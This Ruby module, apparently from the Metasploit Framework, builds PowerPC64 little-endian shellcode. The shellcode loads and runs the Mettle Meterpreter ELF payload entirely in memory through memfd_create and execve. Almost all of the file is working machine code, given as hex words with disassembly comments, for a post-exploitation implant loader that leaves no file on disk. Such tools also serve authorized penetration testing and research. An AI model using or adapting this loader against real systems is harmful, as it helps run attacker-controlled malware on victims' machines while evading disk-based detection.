#
# In memory loader used to execute Mettle ELF file.
# Compatible with Kernel Linux >= 3.17 (where memfd_create is introduced)
# Author: Martin Sutovsky <martin_sutovsky[at]rapid7.com>
# Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
#

module Msf::Payload::Linux::Ppc64le::MeterpreterLoader
  def in_memory_loader(payload)
    in_memory_loader = [
      0x4800007c, # 0x1000:	b	0x107c	0x4800007c
      0x7de802a6, # 0x1004:	mflr	r15	0x7de802a6
      0x39c00000, # 0x1008:	li	r14, 0	0x39c00000
      0x95c10000, # 0x100c:	stwu	r14, 0(r1)	0x95c10000
      0x7c230b78, # 0x1010:	mr	r3, r1	0x7c230b78
      0x38800000, # 0x1014:	li	r4, 0	0x38800000
      0x38000168, # 0x1018:	li	r0, 0x168	0x38000168
      0x44000002, # 0x101c:	sc		0x44000002
      0x7df07b78, # 0x1020:	mr	r16, r15	0x7df07b78
      0x7c711b78, # 0x1024:	mr	r17, r3	0x7c711b78
      0x80af0000, # 0x1028:	lwz	r5, 0(r15)	0x80af0000
      0x39ef0022, # 0x102c:	addi	r15, r15, 0x22	0x39ef0022
      0x7de47b78, # 0x1030:	mr	r4, r15	0x7de47b78
      0x38000004, # 0x1034:	li	r0, 4	0x38000004
      0x44000002, # 0x1038:	sc		0x44000002
      0x3a100020, # 0x103c:	addi	r16, r16, 0x20	0x3a100020
      0x3a40000a, # 0x1040:	li	r18, 0xa	0x3a40000a
      0x7e7193d6, # 0x1044:	divw	r19, r17, r18	0x7e7193d6
      0x7e9391d6, # 0x1048:	mullw	r20, r19, r18	0x7e9391d6
      0x7eb48850, # 0x104c:	subf	r21, r20, r17	0x7eb48850
      0x3ab50030, # 0x1050:	addi	r21, r21, 0x30	0x3ab50030
      0x7e719b78, # 0x1054:	mr	r17, r19	0x7e719b78
      0x96b0ffff, # 0x1058:	stwu	r21, -1(r16)	0x96b0ffff
      0x2c110000, # 0x105c:	cmpwi	r17, 0	0x2c110000
      0x4082ffe4, # 0x1060:	bne	0x1044	0x4082ffe4
      0x39efffe2, # 0x1064:	addi	r15, r15, -0x1e	0x39efffe2
      0x7de37b78, # 0x1068:	mr	r3, r15	0x7de37b78
      0x7ca52a78, # 0x106c:	xor	r5, r5, r5	0x7ca52a78
      0x7c842278, # 0x1070:	xor	r4, r4, r4	0x7c842278
      0x3800000b, # 0x1074:	li	r0, 0xb	0x3800000b
      0x44000002, # 0x1078:	sc		0x44000002
      0x4bffff89, # 0x107c:	bl	0x1004	0x4bffff89
      payload.length
    ].pack('V*')
    fd_path = '/proc/self/fd/'.bytes.pack('C*') + "\x2f" * 14 + "\x00" * 2
    in_memory_loader+fd_path
  end
end
